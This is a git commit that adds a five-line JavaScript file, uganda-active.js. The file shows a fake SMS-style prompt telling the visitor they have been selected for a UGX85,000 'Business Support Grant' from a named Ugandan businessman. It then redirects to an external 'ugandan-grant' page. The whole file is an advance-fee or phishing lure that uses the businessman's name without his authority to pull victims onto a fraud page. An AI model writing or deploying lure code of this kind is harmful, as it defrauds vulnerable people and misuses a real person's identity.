a401cadc6ff342652bf26552f866b45cac7086f9
sureconnect001 <ukpe247@gmail.com>
2025-05-26 06:36:07 +0100

    Create uganda-active.js

---
+++ uganda-active.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW UGX85,000'
+password=prompt('SMS: Congratulations, you are among the selected ones to receive UGX85,000 Business Support Grant from Sudhir Ruparelia, Press Ok to withdraw cash Now ','WITHDRAW UGX85,000');
+if (password != 'WITHDRAW UGX85,000') {
+location.href='https://sure-connect.org/ugandan-grant.html';
+}
